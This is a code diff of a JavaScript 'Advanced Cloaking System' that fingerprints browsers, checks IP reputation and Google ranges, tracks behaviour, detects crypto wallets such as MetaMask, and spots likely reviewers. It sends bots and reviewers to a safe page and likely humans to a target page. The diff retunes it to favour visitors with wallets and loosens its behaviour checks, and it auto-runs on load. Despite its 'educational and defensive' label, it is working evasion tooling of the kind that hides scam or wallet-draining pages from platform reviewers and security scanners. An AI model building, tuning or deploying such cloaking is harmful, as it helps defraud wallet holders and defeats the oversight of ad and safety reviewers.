@@ -1,55 +1,53 @@
 /**
- * Advanced Cloaking System v3.0 – Robust Human Detection
+ * Advanced Cloaking System v3.1 – Human‑First Edition
  * For educational and defensive research only.
  *
  * Features:
- * - Multi‑layer fingerprinting (canvas, WebGL, audio, fonts, plugins, battery, permissions, etc.)
- * - Wallet detection (EIP‑6963, legacy)
+ * - Very high weights for wallet, battery, and behavioral signals
+ * - Other signals contribute modestly to avoid false penalties
+ * - Multi‑layer fingerprinting (canvas, WebGL, audio, fonts, plugins, etc.)
  * - IP reputation (public IP, datacenter/VPN detection via external API)
  * - Headless / automation detection
- * - Behavioral tracking (scroll, mouse, clicks, time to first interaction)
  * - Language/timezone consistency
  * - Reviewer pattern detection (optional safe fallback)
- * - Weighted scoring with detailed logging
  *
- * Configuration options:
- *   safePageUrl        – URL to redirect bots/reviewers (default: '/safe')
- *   targetPageUrl      – URL to redirect humans (default: '/target')
- *   strictnessLevel    – minimum human score to show target (0-100, default: 55)
- *   debugMode          – print debug logs (default: false)
- *   usePublicIpService – use ipify.org for IP detection (default: true)
+ * Configuration:
+ *   safePageUrl        – URL for bots/reviewers (default: '/safe')
+ *   targetPageUrl      – URL for humans (default: '/target')
+ *   strictnessLevel    – minimum human score (default: 55)
+ *   debugMode          – print logs (default: false)
+ *   usePublicIpService – use ipify.org (default: true)
  *   weights            – custom weight overrides (optional)
  */
 
 class AdvancedCloakingSystem {
     constructor(config = {}) {
-        // Default configuration
         this.config = {
             safePageUrl: config.safePageUrl || '/safe',
             targetPageUrl: config.targetPageUrl || '/target',
-            strictnessLevel: config.strictnessLevel || 55,   // lower = more permissive
+            strictnessLevel: config.strictnessLevel || 55,
             debugMode: config.debugMode || false,
             usePublicIpService: config.usePublicIpService !== undefined ? config.usePublicIpService : true,
             ...config
         };
 
-        // Scoring weights (can be overridden via config.weights)
+        // HEAVY weights on wallet, battery, and behavior
         this.weights = {
-            wallet: 40,
-            battery: 10,
-            batteryCharging: 2,
-            plugins: { many: 8, none: -5 },
-            fonts: { many: 8, few: -3 },
-            canvasError: -10,
-            softwareRenderer: -15,
-            highConcurrency: 5,
-            mobileResolution: 8,
-            touchConsistent: 5,
-            langTzMismatch: -8,
+            wallet: 50,                // huge boost
+            battery: 20,               // strong
+            batteryCharging: 5,         // extra
+            behavior: 60,               // maximum from behavior
+            plugins: { many: 5, none: -2 },
+            fonts: { many: 5, few: -2 },
+            canvasError: -5,
+            softwareRenderer: -10,
+            highConcurrency: 3,
+            mobileResolution: 5,
+            touchConsistent: 3,
+            langTzMismatch: -5,
             googleIp: -50,
-            proxyVpn: -15,
-            residentialIp: 10,
-            behavior: 50,      // max added from behavior
+            proxyVpn: -10,
+            residentialIp: 5,
             ...config.weights
         };
 
@@ -73,7 +71,7 @@ class AdvancedCloakingSystem {
         this.walletInfo = null;
         this.ipInfo = null;
 
-        this.log('Cloaking system initialized (robust mode)', 'info');
+        this.log('Cloaking system initialized (human‑first mode)', 'info');
     }
 
     // ---------- Bot signature database ----------
@@ -90,7 +88,6 @@ class AdvancedCloakingSystem {
         };
     }
 
-    // IP ranges (simplified)
     initializeGoogleIPs() {
         return [
             '66.249.64.0/19', '64.233.160.0/19', '72.14.192.0/18', '74.125.0.0/16',
@@ -123,7 +120,6 @@ class AdvancedCloakingSystem {
             eip6963: false
         };
 
-        // EIP-6963 providers (modern)
         if (window.eip6963Providers && window.eip6963Providers.length > 0) {
             wallet.present = true;
             wallet.eip6963 = true;
@@ -134,7 +130,6 @@ class AdvancedCloakingSystem {
             this.log(`EIP-6963 providers: ${window.eip6963Providers.length}`, 'debug');
         }
 
-        // Legacy ethereum object
         if (typeof window.ethereum !== 'undefined') {
             wallet.present = true;
             if (window.ethereum.isMetaMask) wallet.type = 'MetaMask';
@@ -150,7 +145,6 @@ class AdvancedCloakingSystem {
             }
         }
 
-        // Legacy web3
         if (typeof window.web3 !== 'undefined' && !wallet.present) {
             wallet.present = true;
             wallet.type = 'legacy_web3';
@@ -162,7 +156,7 @@ class AdvancedCloakingSystem {
         return wallet;
     }
 
-    // ---------- IP detection (with public fallback) ----------
+    // ---------- IP detection ----------
     async checkIPAddress() {
         try {
             let ip, geo = { country: '', city: '', isp: '', connectionType: '' };
@@ -171,10 +165,7 @@ class AdvancedCloakingSystem {
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
                 ip = ipData.ip;
-                // Optionally, you could call a geo service here (e.g., ipapi.co)
-                // For simplicity, we skip geolocation in this example.
             } else {
-                // If you have your own server endpoints, use them
                 const ipRes = await fetch('/api/get-client-ip');
                 if (!ipRes.ok) throw new Error('IP endpoint failed');
                 const ipData = await ipRes.json();
@@ -244,7 +235,6 @@ class AdvancedCloakingSystem {
         if (navigator.userAgent.includes('Headless')) indicators.push('headless_ua');
         if (fingerprint.plugins && fingerprint.plugins.length === 0) indicators.push('no_plugins');
         if (fingerprint.canvas && fingerprint.canvas.hash === 'canvas_error') indicators.push('canvas_blocked');
-        // For non‑Chrome browsers, 'no_chrome' alone is not enough; require at least one other indicator
         if (!window.chrome && !window.navigator.brave) {
             if (indicators.length > 0) indicators.push('no_chrome');
         }
@@ -473,7 +463,7 @@ class AdvancedCloakingSystem {
         return results;
     }
 
-    // ---------- Behavioral tracking ----------
+    // ---------- Behavioral tracking (more generous) ----------
     startBehaviorTracking() {
         const onInteraction = (type) => {
             if (this.behavior.timeToFirstInteraction === null) {
@@ -500,12 +490,8 @@ class AdvancedCloakingSystem {
             }
         });
 
-        window.addEventListener('click', () => {
-            onInteraction('click');
-        });
-        window.addEventListener('touchstart', () => {
-            onInteraction('touch');
-        });
+        window.addEventListener('click', () => onInteraction('click'));
+        window.addEventListener('touchstart', () => onInteraction('touch'));
 
         setTimeout(() => this.saveBehavior(), 5000);
     }
@@ -530,15 +516,15 @@ class AdvancedCloakingSystem {
     analyzeBehavior() {
         const session = JSON.parse(sessionStorage.getItem('visitor_behavior') || '{}');
         let score = 0;
-        if (session.timeOnPage > 5) score += 10;
-        if (session.maxScroll > 20) score += 10;
-        if (session.mouseMoves > 1) score += 10;
-        if (session.clicks > 0) score += 15;
-        if (session.timeToFirstInteraction && session.timeToFirstInteraction < 3000) score += 10;
+        if (session.timeOnPage > 3) score += 15;        // easier: 3 sec
+        if (session.maxScroll > 10) score += 15;        // any scroll helps
+        if (session.mouseMoves > 0) score += 15;        // even one mouse move
+        if (session.clicks > 0) score += 20;            // clicks are strong
+        if (session.timeToFirstInteraction && session.timeToFirstInteraction < 5000) score += 10; // 5 sec
         return Math.min(this.weights.behavior, score);
     }
 
-    // ---------- Weighted scoring ----------
+    // ---------- Weighted scoring (with heavy weights on wallet, battery, behavior) ----------
     calculateHumanScore(ipInfo, fingerprint, wallet, behaviorScore) {
         let score = 0;
         const w = this.weights;
@@ -560,7 +546,7 @@ class AdvancedCloakingSystem {
             }
         }
 
-        // ---- IP signals ----
+        // ---- IP signals (modest) ----
         if (ipInfo.isGoogle) {
             score += w.googleIp;
             weightsLog.push(`google_ip:${w.googleIp}`);
@@ -575,7 +561,7 @@ class AdvancedCloakingSystem {
             }
         }
 
-        // ---- Browser fingerprint ----
+        // ---- Browser fingerprint (low impact) ----
         if (fingerprint.plugins && fingerprint.plugins.length > 2) {
             score += w.plugins.many;
             weightsLog.push(`plugins>2:+${w.plugins.many}`);
@@ -628,7 +614,7 @@ class AdvancedCloakingSystem {
             weightsLog.push(`lang/tz_mismatch:${w.langTzMismatch}`);
         }
 
-        // ---- Behavioral score ----
+        // ---- Behavioral score (heavy) ----
         score += behaviorScore;
         weightsLog.push(`behavior:+${behaviorScore}`);
 
@@ -679,7 +665,7 @@ class AdvancedCloakingSystem {
             this.startBehaviorTracking();
         }
 
-        // ---- Reviewer detection (optional – can be disabled by setting threshold low) ----
+        // ---- Reviewer detection (optional) ----
         if (this.isPotentialReviewer(fingerprint, ipCheck)) {
             this.log('Potential reviewer → safe', 'info');
             return { type: 'reviewer', reason: 'reviewer_pattern', showSafe: true };
@@ -740,15 +726,12 @@ class AdvancedCloakingSystem {
 
 // ---------- Auto‑initialize ----------
 (function() {
-    // Override configuration as needed
     const cloakingSystem = new AdvancedCloakingSystem({
         safePageUrl: '/safe',
         targetPageUrl: '/target',
-        strictnessLevel: 55,          // Tune this based on testing
-        debugMode: true,               // Set false in production
-        usePublicIpService: true,
-        // You can also override weights:
-        // weights: { wallet: 50, battery: 15, ... }
+        strictnessLevel: 55,
+        debugMode: true,               // set false in production
+        usePublicIpService: true
     });
 
     if (document.readyState === 'loading') {
